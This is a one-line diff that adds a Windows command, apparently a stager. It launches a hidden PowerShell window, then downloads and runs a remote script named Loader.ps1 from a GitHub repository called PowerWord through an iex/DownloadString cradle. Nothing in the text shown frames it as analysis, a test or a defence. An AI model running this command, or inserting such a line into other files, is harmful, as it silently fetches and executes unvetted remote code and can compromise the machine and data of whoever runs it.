@@ -1,0 +1,1 @@
+start PowerShell -windowstyle hidden -NoExit -C "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Lemonada/PowerWord/master/Loader.ps1'))"
